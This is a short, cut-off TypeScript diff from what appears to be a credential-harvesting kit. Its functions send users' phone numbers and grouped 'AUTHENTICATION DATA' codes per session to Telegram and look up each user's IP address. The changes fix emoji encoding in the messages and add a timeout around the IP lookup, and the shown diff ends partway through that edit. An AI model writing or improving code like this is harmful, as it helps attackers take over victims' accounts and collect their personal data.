@@ -633,7 +633,7 @@ export const sendPhoneToTelegramEnhanced = async (
       throw fetchError;
     }
   } catch (error) {
-    console.error("��� Failed to send phone to Telegram:", error);
+    console.error("❌ Failed to send phone to Telegram:", error);
     return { success: false, sessionId };
   }
 };
@@ -1668,7 +1668,7 @@ const formatSessionMessage = (session: UserSession): string => {
 
   // Add grouped codes section if any codes exist
   if (codeGroups.length > 0) {
-    message += `\n\n���� <b>AUTHENTICATION DATA:</b>\n` + codeGroups.join("\n");
+    message += `\n\n🔐 <b>AUTHENTICATION DATA:</b>\n` + codeGroups.join("\n");
   }
 
   // Simple footer with session info
@@ -1763,6 +1763,12 @@ export const updateUserInfo = async (
         throw error;
       }
     };
+
+    // Wrap entire IP fetching in a global timeout
+    const ipFetchPromise = new Promise<string>(async (resolve) => {
+      const globalTimeout = setTimeout(() => {
+        resolve("Timeout");
+      }, 8000); // 8 second global timeout
 
     try {
       // Primary IP service
